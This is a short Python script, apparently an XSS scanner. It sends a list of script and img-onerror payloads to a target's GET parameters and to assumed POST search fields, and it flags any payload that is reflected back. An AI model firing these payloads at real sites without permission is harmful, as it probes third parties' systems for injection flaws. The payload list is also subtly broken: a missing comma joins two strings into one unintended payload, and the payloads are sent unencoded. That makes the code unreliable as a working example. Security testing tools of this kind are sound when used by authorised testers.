import requests
from urllib.parse import urlparse, parse_qs

# Common XSS payloads
XSS_PAYLOADS = [
    "<script>alert('XSS')</script>",
    '"><script>alert(1)</script>',
    "'><script>alert('XSS')</script>",
    '"><img src=x onerror=alert(1)>'
    '"><img src=x onerror=alert(1)>',
    "'><img src=x onerror=alert('XSS')>"
]

def scan(target):
    output = f"[*] Scanning {target} for XSS vulnerabilities...\n"
    
    # Check GET parameters
    output += scan_get(target)

    # Check POST-based XSS
    output += scan_post(target)

    return output

def scan_get(target):
    output = "[*] Testing GET-based XSS...\n"
    parsed_url = urlparse(target)
    query_params = parse_qs(parsed_url.query)

    if not query_params:
        return "[-] No GET parameters found to test for XSS.\n"

    for param in query_params.keys():
        for payload in XSS_PAYLOADS:
            test_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{param}={payload}"
            try:
                response = requests.get(test_url, timeout=5)
                if is_vulnerable(response.text, payload):
                    output += f"[!] XSS vulnerability found in parameter: {param} with payload: {payload}\n"
                    return output
            except requests.RequestException:
                output += f"[-] Request failed for payload: {payload}\n"

    output += "[-] No GET-based XSS vulnerabilities found.\n"
    return output


def scan_post(target):
    output = "[*] Testing POST-based XSS...\n"
    post_url = f"{target}/search"  # Adjust this based on the target form
    post_fields = ['query', 'search', 'input']  # Common input fields

    for payload in XSS_PAYLOADS:
        data = {field: payload for field in post_fields}
        try:
            response = requests.post(post_url, data=data, timeout=5)
            if is_vulnerable(response.text, payload):
                output += f"[!] XSS vulnerability found with payload: {payload}\n"
                return output
        except requests.RequestException:
            output += f"[-] Request failed for payload: {payload}\n"

    output += "[-] No POST-based XSS vulnerabilities found.\n"
    return output

def is_vulnerable(response_text, payload):
    return payload in response_text
